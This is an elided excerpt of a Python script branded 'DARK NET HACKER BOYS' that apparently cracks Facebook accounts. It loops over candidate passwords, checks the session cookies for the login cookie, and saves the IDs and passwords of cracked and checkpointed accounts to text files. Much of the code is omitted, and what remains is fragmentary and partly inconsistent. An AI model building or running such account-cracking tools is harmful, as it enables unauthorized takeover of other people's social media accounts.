...
def logo():
    print("""
    [1;90m———————————————————————————————————
    [1;97m[[47m[1;92m>)[0m[1;97m OWNER       : ASRAF-MAHDI
    [1;97m[[47m[1;92m>)[0m [1;97mFACEBOOK    : DARK NET HACKER BOYS
    [1;97m[[47m[1;92m>)[0m [1;97mNUMBER      : [1;92m
    [1;90m———————————————————————————————————""")
...
def Main():
    ...
    print(' [+] Ids saved in D-N-H-BOYS-OK.txt,-CP.txt')
    print('-------------------') 
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print(f"[1;32m[D-N-H-BOYS]  {cid} - {ps}          ")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"[1;30m[D-N-H-BOYS-CP] {uid} | {ps}   ")
